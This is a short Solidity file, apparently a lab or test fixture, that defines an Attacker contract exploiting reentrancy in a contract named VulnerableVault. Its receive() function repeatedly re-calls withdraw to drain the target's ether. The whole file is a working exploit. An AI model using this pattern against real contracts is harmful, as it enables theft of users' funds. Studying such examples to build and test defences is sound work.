// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import {VulnerableVault} from "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public target;

    constructor(VulnerableVault _target) {
        target = _target;
    }

    function attack(uint256 amount) external payable {
        target.deposit{value: amount}();
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}
